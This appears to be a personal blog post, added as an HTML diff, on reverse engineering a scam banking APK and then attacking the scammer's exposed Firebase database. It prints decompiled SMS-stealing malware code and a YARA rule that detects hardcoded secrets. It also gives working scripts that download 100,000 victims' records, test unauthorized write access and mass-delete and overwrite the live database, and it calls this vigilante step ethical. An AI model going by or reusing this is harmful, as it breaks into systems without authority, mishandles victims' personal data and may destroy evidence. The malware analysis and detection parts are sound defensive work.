@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#000000" />
+  <link rel="icon" href="/Aaron.webp" />
+  <link rel="preload" as="image" href="/Aaron.webp" />
+  <script>
+    (function () {
+      document.documentElement.classList.add("js");
+      try {
+        var s = localStorage.getItem("theme");
+        var t = s || "light";
+        document.documentElement.dataset.theme = t;
+      } catch (e) {}
+    })();
+  </script>
+  <title>Turning the Tables on a Scammer's Banking Trojan — Aaron Thomas</title>
+    <meta name="description" content="Analyzing a fake bank APK, finding the developer's exposed database, and flipping the attack." />
+    <link rel="canonical" href="https://arxhr007.github.io/blog/scam-app" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Turning the Tables on a Scammer's Banking Trojan — Aaron Thomas" />
+    <meta property="og:description" content="Analyzing a fake bank APK, finding the developer's exposed database, and flipping the attack." />
+    <meta property="og:url" content="https://arxhr007.github.io/blog/scam-app" />
+    <meta property="og:image" content="https://arxhr007.github.io/og-image.png" />
+    <meta property="og:site_name" content="Aaron Thomas" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Turning the Tables on a Scammer's Banking Trojan — Aaron Thomas" />
+    <meta name="twitter:description" content="Analyzing a fake bank APK, finding the developer's exposed database, and flipping the attack." />
+    <meta name="twitter:image" content="https://arxhr007.github.io/og-image.png" />
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Turning the Tables on a Scammer's Banking Trojan","description":"Analyzing a fake bank APK, finding the developer's exposed database, and flipping the attack.","datePublished":"2025-04-20","keywords":"Android, Reverse Engineering, OSINT","author":{"@type":"Person","name":"Aaron Thomas","url":"https://arxhr007.github.io"},"mainEntityOfPage":"https://arxhr007.github.io/blog/scam-app"}</script>
+  <script type="module" crossorigin src="/assets/index-DDpEh1BO.js"></script>
+  <link rel="stylesheet" crossorigin href="/assets/index-w5tfyKVj.css">
+</head>
+<body>
+  <div id="root"><nav class="top-nav"><div class="nav-left"><a href="/" class="brand">Aaron Thomas</a><button class="theme-toggle" type="button" aria-label="Toggle theme" title="Toggle theme"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z" fill="currentColor"></path></svg></button></div><button class="hamburger" aria-label="Toggle menu" aria-expanded="false"><span></span><span></span><span></span></button><div class="nav-actions"><a href="/blog" class="nav-btn" aria-current="page">Blog</a><a class="nav-btn" href="/Aaron_Thomas.pdf" target="_blank" rel="noreferrer">Download Resume</a></div></nav><main class="container"><article class="card post"><a href="/blog" class="back-link">← All posts</a><header class="post-header"><h1>Turning the Tables on a Scammer&#x27;s Banking Trojan</h1><p class="post-meta">Apr 20, 2025<!-- --> · <!-- -->9<!-- --> min read</p><div class="tag-list"><span class="tag">Android</span><span class="tag">Reverse Engineering</span><span class="tag">OSINT</span></div></header><div class="post-body"><nav class="toc" aria-label="Table of contents"><button class="toc-toggle" type="button" aria-expanded="false">On this page</button><ul><li class=""><a href="#introduction" class="">Introduction</a></li><li class=""><a href="#step-1-unpacking-the-apk" class="">Step 1: Unpacking the APK</a></li><li class="toc-sub"><a href="#apk-structure-deep-dive" class="">APK Structure Deep Dive</a></li><li class=""><a href="#step-2-decompiling-with-jadx" class="">Step 2: Decompiling with JADX</a></li><li class="toc-sub"><a href="#key-code-findings" class="">Key Code Findings</a></li><li class=""><a href="#step-3-writing-a-yara-rule-to-find-api-keys" class="">Step 3: Writing a YARA Rule to Find API Keys</a></li><li class="toc-sub"><a href="#what-is-yara" class="">What is YARA?</a></li><li class=""><a href="#step-4-jackpot-finding-the-firebase-database" class="">Step 4: Jackpot - Finding the Firebase Database</a></li><li class=""><a href="#step-5-investigating-the-database" class="">Step 5: Investigating the Database</a></li><li class=""><a href="#step-6-testing-write-access" class="">Step 6: Testing Write Access</a></li><li class=""><a href="#step-7-ethical-countermeasure-the-scammer-spammer-script" class="">Step 7: Ethical Countermeasure - The Scammer-Spammer Script</a></li><li class="toc-sub"><a href="#understanding-the-scammer-spammerpy-script" class="">Understanding the scammer-spammer.py Script</a></li><li class=""><a href="#conclusion" class="">Conclusion</a></li></ul></nav><div class="prose"><h1 id="how-i-turned-the-tables-on-a-scammer-by-reverse-engineering-their-banking-trojan-app">How I Turned the Tables on a Scammer by Reverse Engineering Their Banking Trojan App</h1>
+<h2 id="introduction">Introduction</h2>
+<p>Recently, I received a suspicious APK file from someone attempting to scam me. They claimed to be from a state bank. Instead of falling victim, I decided to investigate the app and see exactly what it was trying to do. What I found was shocking - not only was the app collecting sensitive user data, but the developer had left their database completely exposed. Here&#39;s how I discovered the vulnerability and turned the tables on the scammer.</p>
+<blockquote>
+<p><strong>Note:</strong> All the content is easy and simple, so non-Geek people can understand. Don&#39;t worry!</p>
+</blockquote>
+<p><img src="https://i.ibb.co/v47Z5qLx/bank.jpg" alt="bank"></p>
+<h2 id="step-1-unpacking-the-apk">Step 1: Unpacking the APK</h2>
+<p>An APK (Android Package Kit) is essentially a zip file with a different extension. My first step was to unzip it to examine its contents using apktool:</p>
+<pre><code class="language-bash">apktool d scam.apk 
+</code></pre>
+<p><img src="https://i.ibb.co/x85f00V6/apkt.png" alt="apktool"></p>
+<p>After unpacking, I found the standard APK structure including the <code>classes.dex</code> files (containing compiled code) and <code>resources.arsc</code> (containing the app&#39;s resources).</p>
+<p><img src="https://i.ibb.co/8nTJmJ67/Screenshot-from-2025-04-02-19-26-32.png" alt="unzip"></p>
+<h3 id="apk-structure-deep-dive">APK Structure Deep Dive</h3>
+<p>The unpacked APK revealed a typical Android app structure:</p>
+<ul>
+<li><strong>classes.dex files</strong> - These contain the compiled bytecode that the Android runtime executes</li>
+<li><strong>res/</strong> directory - Contains all app resources such as layouts, strings, and images</li>
+<li><strong>AndroidManifest.xml</strong> - Defines the app&#39;s structure, components, and permissions</li>
+<li><strong>assets/</strong> - Contains additional resources used by the app</li>
+<li><strong>resources.arsc file</strong> - compiled resource file that stores precompiled Android resources like strings, colors, dimensions, and localized content.</li>
+</ul>
+<p>Looking at the AndroidManifest.xml, I noticed the app requested extensive permissions including:</p>
+<ul>
+<li>READ_SMS</li>
+<li>READ_CONTACTS  </li>
+<li>READ_PHONE_STATE</li>
+<li>RECEIVE_SMS</li>
+<li>INTERNET</li>
+</ul>
+<p>These permissions alone should raise red flags, as a legitimate banking app would not need access to read all SMS messages or contacts.</p>
+<h2 id="step-2-decompiling-with-jadx">Step 2: Decompiling with JADX</h2>
+<p>The next step was to convert the DEX files back into readable Java source code. For this, I used JADX, a popular DEX to Java decompiler.</p>
+<p>Instead of manually running JADX on each file, I created a bash script to recursively process all the files:</p>
+<pre><code class="language-bash">#!/bin/bash
+APK_FOLDER=&quot;scam&quot;
+find &quot;$APK_FOLDER&quot; \( -iname &quot;*.dex&quot; -o -iname &quot;*.arsc&quot; \) -type f -print0 | while IFS= read -r -d &#39;&#39; file; do
+    output_dir=&quot;${file}_jadx&quot;
+    echo &quot;Decompiling file: $file&quot;
+    mkdir -p &quot;$output_dir&quot;
+    jadx -d &quot;$output_dir&quot; &quot;$file&quot;
+done
+</code></pre>
+<p>Output:</p>
+<pre><code>arn@arxhr007:~/Desktop/scam$ bash decompile.sh 
+Decompiling file: scam/classes2.dex
+INFO  - loading ...
+INFO  - processing ...
+INFO  - done                                                 
+Decompiling file: scam/classes.dex
+INFO  - loading ...
+INFO  - processing ...
+ERROR - finished with errors, count: 3                       
+Decompiling file: scam/classes3.dex
+INFO  - loading ...
+INFO  - processing ...
+INFO  - done                                                 
+Decompiling file: scam/resources.arsc
+INFO  - loading ...
+INFO  - processing ...
+INFO  - done 
+</code></pre>
+<p>This gave me access to the app&#39;s source code which I thought might be obfuscated, but luckily it wasn&#39;t. Now I could analyze it for suspicious activity.</p>
+<h3 id="key-code-findings">Key Code Findings</h3>
+<p>Examining the decompiled code, I found several concerning components like this and much more:</p>
+<pre><code class="language-java">// SMS collection and forwarding mechanism
+    public void onReceive(Context ctx, Intent data) {
+        Bundle bundle;
+        Object[] pduArray;
+        Log.d(&quot;SMSListener&quot;, &quot;SMS Received&quot;);
+        if (!&quot;android.provider.Telephony.SMS_RECEIVED&quot;.equals(data.getAction()) || (bundle = data.getExtras()) == null || (pduArray = (Object[]) bundle.get(&quot;pdus&quot;)) == null) {
+            return;
+        }
+        for (Object pdu : pduArray) {
+            SmsMessage sms = Build.VERSION.SDK_INT &gt;= 23 ? SmsMessage.createFromPdu((byte[]) pdu, bundle.getString(&quot;format&quot;)) : SmsMessage.createFromPdu((byte[]) pdu);
+            String text = sms.getMessageBody();
+            String sender = sms.getOriginatingAddress();
+            String deviceId = new DeviceInfoService(ctx).getId();
+            TelephonyManager telManager = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
+            String networkInfo = telManager != null ? &quot;Provider: &quot; + telManager.getNetworkOperatorName() + &quot;, SIM: &quot; + telManager.getLine1Number() : &quot;Unknown&quot;;
+            if (sender != null &amp;&amp; !text.isEmpty()) {
+                processSMS(ctx, sender, text, networkInfo);
+                logSMS(ctx, sender, text, networkInfo, deviceId);
+            }
+        }
+    }
+</code></pre>
+<p>This code was intercepting all incoming SMS messages and uploading them to Firebase. While legitimate banking apps might need to read OTP messages, they would never upload the full content of all SMS messages to an external server.</p>
+<h2 id="step-3-writing-a-yara-rule-to-find-api-keys">Step 3: Writing a YARA Rule to Find API Keys</h2>
+<p>Looking through thousands of lines of code manually would be tedious, so I created a YARA rule specifically designed to find API keys and sensitive credentials.</p>
+<h3 id="what-is-yara">What is YARA?</h3>
+<p>YARA is a pattern matching tool designed to help malware researchers identify and classify malware. It&#39;s often described as &quot;the Swiss Army knife of pattern matching&quot; and allows you to create rules (based on textual or binary patterns) to search for specific strings or patterns in files. YARA rules are widely used in cybersecurity for:</p>
+<ul>
+<li>Malware detection and classification</li>
+<li>Threat hunting</li>
+<li>Digital forensics</li>
+<li>Incident response</li>
+<li>Reverse engineering</li>
+</ul>
+<p>YARA rules consist of three main components: meta information, strings definitions, and conditions. The strings section defines patterns to search for, while the conditions section defines the logic for when a rule should match.</p>
+<p>Here&#39;s the YARA rule I created:</p>
+<pre><code class="language-bash">rule APK_Analysis
+{
+    meta:
+        author = &quot;arxhr007&quot;
+        description = &quot;Detects backend technologies, API keys, and sensitive info in an APK&quot;
+    strings:
+        $api_key_google      = /AIza[0-9A-Za-z-_]{35}/
+        $api_key_firebase    = /AAAA[a-zA-Z0-9_-]{7}:[a-zA-Z0-9_-]{140}/
+        $api_key_aws         = /AKIA[0-9A-Z]{16}/
+        $api_key_other       = /\b[0-9a-f]{32}\b/
+        $api_key_stripe      = /sk_live_[0-9a-zA-Z]{24}/
+        $api_key_slack       = /xox[baprs]-[0-9A-Za-z]{10,48}/
+        $api_key_github      = /ghp_[0-9A-Za-z]{36}/
+        $api_key_mailgun     = /key-[0-9a-zA-Z]{32}/
+        $api_key_twilio_sid  = /AC[0-9A-Za-z]{32}/
+        $firebase_url            = /https:\/\/[^&quot;&#39;\s]+\.firebaseio\.com/
+        $graphql                 = /graphql/i
+        $php_backend             = /\.php[&quot;&#39;]/
+        $node_backend            = /express|koa|sails/i
+        $django_backend          = /django|rest_framework/i
+        $laravel_backend         = /laravel|Illuminate/i
+        $jwt                     = /eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}/
+        $sql_creds               = /(jdbc:mysql:\/\/|postgres:\/\/|mongodb:\/\/)[^&quot;&#39;\s]+/
+        $firebase_service_account= /&quot;type&quot;:\s*&quot;service_account&quot;.{1,500}&quot;private_key&quot;:\s*&quot;-----BEGIN PRIVATE KEY-----/s
+        $hardcoded_passwords     = /(password\s*=\s*&quot;[^&quot;]+&quot;|password:\s*&quot;[^&quot;]+&quot;)/i
+    condition:
+        any of (
+            $api_key_google,
+            $api_key_firebase,
+            $api_key_aws,
+            $api_key_other,
+            $api_key_stripe,
+            $api_key_slack,
+            $api_key_github,
+            $api_key_mailgun,
+            $api_key_twilio_sid
+        ) or any of (
+            $firebase_url,
+            $graphql,
+            $php_backend,
+            $node_backend,
+            $django_backend,
+            $laravel_backend,
+            $jwt,
+            $sql_creds,
+            $firebase_service_account,
+            $hardcoded_passwords
+        )
+}
+</code></pre>
+<p>I ran the rule against the decompiled sources (the entire folder):</p>
+<pre><code class="language-bash">yara -w -r -s apk_yara.yar scam
+</code></pre>
+<p>Output:</p>
+<p><img src="https://i.ibb.co/nMXzwVvq/finalreal.jpg" alt="YARA results"></p>
+<h2 id="step-4-jackpot-finding-the-firebase-database">Step 4: Jackpot - Finding the Firebase Database</h2>
+<p>The scan revealed something critical: the app was using Firebase Realtime Database with an exposed API key. Even more concerning, the database had no proper security rules in place.</p>
+<p>The URL structure looked something like:</p>
+<pre><code>https://xcpbank-app-rtdb.firebaseio.com/
+</code></pre>
+<blockquote>
+<p>Note : For this blog I used fake firebase realtime database url of Scammer for Ethical reasons !</p>
+</blockquote>
+<h2 id="step-5-investigating-the-database">Step 5: Investigating the Database</h2>
+<p>Using Python and the Firebase REST API, I wrote a script to check what data was being stored:</p>
+<pre><code class="language-python">import requests
+import json
+
+database_url = &#39;https://xcpbank-app-rtdb.firebaseio.com&#39;  
+response = requests.get(f&#39;{database_url}.json&#39;)  
+if response.status_code == 200:
+    data = response.json()  
+    with open(&#39;data.json&#39;, &#39;w&#39;) as json_file:
+        json.dump(data, json_file, indent=4)  
+    print(&quot;Data saved successfully.&quot;)
+</code></pre>
+<p>Output data.json:</p>
+<p><img src="https://i.ibb.co/V078y31N/data.jpg" alt="Database data"></p>
+<p>To my horror, I found the database contained information from over 100,000 victims, including:</p>
+<ul>
+<li>Full names</li>
+<li>Phone numbers</li>
+<li>MPINs </li>
+<li>SMS messages</li>
+<li>Device information</li>
+<li>And much more personal data</li>
+</ul>
+<p>This data would give scammers everything they need to perform financial fraud, identity theft, and social engineering attacks.</p>
+<h2 id="step-6-testing-write-access">Step 6: Testing Write Access</h2>
+<p>I needed to confirm if the database had proper write restrictions:</p>
+<pre><code class="language-python">import requests
+import json
+
+firebase_url = &quot;https://xcpbank-app-rtdb.firebaseio.com/test.json&quot;
+test_data = {&quot;message&quot;: &quot;Testing write access&quot;}
+
+response = requests.put(firebase_url, json=test_data)
+print(response.status_code)
+print(response.text)
+</code></pre>
+<p>Output:</p>
+<p><img src="https://i.ibb.co/9mGcKQrB/write.png" alt="Write access test"></p>
+<p>The result was alarming - I had full read AND write access to the entire database. This represented a serious security vulnerability that put thousands of people&#39;s data at risk.</p>
+<h2 id="step-7-ethical-countermeasure-the-scammer-spammer-script">Step 7: Ethical Countermeasure - The Scammer-Spammer Script</h2>
+<p>To protect the victims and neutralize the scammer&#39;s operation without causing harm, I decided to replace the stolen data with generated fake data. In the JSON file, there was a node called &quot;sms&quot; which contained sensitive information. I wrote a Python script called <a href="https://pastebin.com/raw/RyBuLTNk" target="_blank" rel="noreferrer">scammer-spammer.py</a> to handle this task.</p>
+<h3 id="understanding-the-scammer-spammerpy-script">Understanding the scammer-spammer.py Script</h3>
+<p>Here&#39;s a breakdown of how the script works:</p>
+<pre><code class="language-python">import requests
+import json
+import re
+from faker import Faker
+import time
+from concurrent.futures import ThreadPoolExecutor
+
+database_url = &#39;https://xxx-rtdb.firebaseio.com&#39;
+fake = Faker()
+
+def sanitize_firebase_key(key):
+    return re.sub(r&#39;[\.\$\#\[\]\/]&#39;, &#39;_&#39;, key)
+
+def generate_fake_data():
+    return {
+        &quot;device_id&quot;: fake.uuid4(),
+        &quot;model&quot;: f&quot;{fake.first_name()}&#39;s {fake.random_element([&#39;A54&#39;, &#39;M21&#39;, &#39;F19&#39;, &#39;X10&#39;])}&quot;,
+        &quot;number&quot;: f&quot;SIM 1: Operator - {fake.random_element([&#39;jio&#39;, &#39;airtel&#39;, &#39;vodafone&#39;])}, Number - {fake.phone_number()}&quot;,
+        &quot;time&quot;: fake.date_time_this_year().strftime(&quot;%m-%d-%Y | %H:%M&quot;)
+    }
+
+def insert_data(data, path=&quot;users&quot;):
+    try:
+        url = f&quot;{database_url}/{path}.json&quot;
+        response = requests.post(url, json=data)
+        if response.status_code == 200:
+            print(f&quot;Data successfully inserted: {data}&quot;)
+            return response.json()
+        else:
+            print(f&quot;Error: {response.status_code} - {response.text}&quot;)
+    except Exception as e:
+        print(f&quot;An error occurred: {e}&quot;)
+
+def delete_data(node_id, path=&quot;users&quot;):
+    try:
+        node_id = sanitize_firebase_key(node_id) 
+        url = f&quot;{database_url}/{path}/{node_id}.json&quot;
+        response = requests.delete(url)
+        if response.status_code == 200:
+            print(f&quot;Node with ID &#39;{node_id}&#39; successfully deleted.&quot;)
+        else:
+            print(f&quot;Error: {response.status_code} - {response.text}&quot;)
+    except Exception as e:
+        print(f&quot;An error occurred: {e}&quot;)
+
+def get_node_ids_from_json(file_path=&quot;data.json&quot;):
+    try:
+        with open(file_path, &#39;r&#39;) as file:
+            data = json.load(file)
+            if isinstance(data, list):
+                return data
+            else:
+                print(&quot;JSON data is not in the expected format (list of node IDs).&quot;)
+                return []
+    except Exception as e:
+        print(f&quot;An error occurred while reading the JSON file: {e}&quot;)
+        return []
+
+def remove_node_id_from_json(node_id, file_path=&quot;data.json&quot;):
+    try:
+        with open(file_path, &#39;r&#39;) as file:
+            data = json.load(file)
+        if node_id in data:
+            data.remove(node_id)
+        with open(file_path, &#39;w&#39;) as file:
+            json.dump(data, file, indent=4)
+        print(f&quot;Node ID &#39;{node_id}&#39; removed from the JSON file.&quot;)
+    except Exception as e:
+        print(f&quot;An error occurred while updating the JSON file: {e}&quot;)
+
+def insert_fake_data_multithreaded(num_entries, max_threads=5, json_file_path=&quot;data.json&quot;):
+    node_ids = get_node_ids_from_json(json_file_path)
+    if not node_ids:
+        print(&quot;Replaced all users&quot;)
+        return
+
+    with ThreadPoolExecutor(max_threads) as executor:
+        futures = []
+        for _ in range(num_entries):
+            fake_data = generate_fake_data()
+            futures.append(executor.submit(insert_data, fake_data, &quot;users&quot;))
+            
+            if node_ids:
+                node_id_to_delete = sanitize_firebase_key(node_ids.pop(0))
+                futures.append(executor.submit(delete_data, node_id_to_delete))
+                futures.append(executor.submit(remove_node_id_from_json, node_id_to_delete, json_file_path))
+                
+            if not node_ids:
+                print(&quot;Replaced all users&quot;)
+                break
+                
+        for future in futures:
+            try:
+                result = future.result()
+                print(f&quot;Insertion, Deletion or Removal result: {result}&quot;)
+            except Exception as e:
+                print(f&quot;Error in thread execution: {e}&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    num_entries = 10000
+    max_threads = 10
+    json_file_path = &quot;data.json&quot;
+    
+    start_time = time.time()
+    insert_fake_data_multithreaded(num_entries, max_threads, json_file_path)
+    end_time = time.time()
+    
+    print(f&quot;Completed insertion of {num_entries} entries, deletion of users, and removal from JSON in {end_time - start_time:.2f} seconds&quot;)
+</code></pre>
+<h4 id="script-breakdown">Script Breakdown:</h4>
+<ol>
+<li><p><strong>Data Generation</strong>: The <code>generate_fake_data()</code> function creates realistic but completely fake device information using the Faker library.</p>
+</li>
+<li><p><strong>Firebase Interactions</strong>: Functions like <code>insert_data()</code> and <code>delete_data()</code> handle the communication with the Firebase database, allowing me to replace real data with fake data.</p>
+</li>
+<li><p><strong>Multi-threading</strong>: To speed up the process, the script uses ThreadPoolExecutor to run multiple operations concurrently. This is crucial when dealing with a large database of over 100,000 entries.</p>
+</li>
+<li><p><strong>Tracking Progress</strong>: The script keeps track of processed IDs in a local JSON file to ensure all data is replaced and to resume if interrupted.</p>
+</li>
+</ol>
+<p><img src="https://i.ibb.co/3mQzJGcY/real-work.png" alt="Script in action"></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Finally, I replaced the entire scammers database with fake data.😌</p>
+<p>This experience highlights several important lessons:</p>
+<ol>
+<li><strong>Always be cautious with APK files from unknown sources</strong></li>
+<li><strong>Proper security configuration is critical for cloud databases</strong></li>
+<li><strong>API keys should never be hardcoded in mobile applications</strong></li>
+<li><strong>Firebase and similar services require careful security rule setup</strong></li>
+<li><strong>Multithreaded approaches can be effective for dealing with large-scale data cleanup</strong></li>
+<li><strong>Even amateur researchers can make a significant impact on security</strong></li>
+</ol>
+<p>Remember: reverse engineering should only be done ethically and legally, and finding vulnerabilities comes with the responsibility to disclose them properly.</p>
+<p>Stay safe online!</p>
+</div></div><nav class="post-nav"><a href="/blog/sandbox-evasion" class="post-nav-link"><span>← Older</span><strong>Sandbox Evasion: How Malware Detects Analysis Environments</strong></a><a href="/blog/rust-malware" class="post-nav-link post-nav-next"><span>Newer →</span><strong>Hacking Printers: Intercepting Print Jobs with Rust Malware</strong></a></nav></article></main><footer class="footer"><p>Aaron Thomas<!-- --> — <span>2026</span></p><p><a href="https://github.com/arxhr007" target="_blank" rel="noreferrer">GitHub</a> <!-- -->•<!-- --> <a href="/blog">Blog</a> •<!-- --> <a href="mailto:aaron123thomas098@gmail.com">Email</a></p></footer></div>
+</body>
+</html>
